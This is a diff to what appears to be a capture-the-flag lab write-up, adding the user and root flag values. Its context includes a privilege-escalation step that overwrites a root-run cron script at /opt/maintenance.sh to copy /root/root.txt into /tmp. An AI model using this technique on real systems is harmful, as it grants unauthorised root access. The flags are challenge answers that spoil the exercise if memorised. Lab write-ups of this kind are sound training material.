@@ -189,6 +189,7 @@ ssh -p 2222 automation@127.0.0.1
 
 ```bash
 cat /home/automation/user.txt
+# Output: ThunderCipher{us3r_sm4rth0me_4uth_byp4ss}
 ```
 
 ---
@@ -207,6 +208,7 @@ The admin dashboard's System Status page reveals a root cron job:
 printf '#!/bin/sh\ncp /root/root.txt /tmp/r.txt\nchmod 644 /tmp/r.txt\n' > /opt/maintenance.sh
 sleep 60
 cat /tmp/r.txt
+# Output: ThunderCipher{r00t_m41nt3n4nc3_cr0n_pwn3d}
 ```
 
 ---
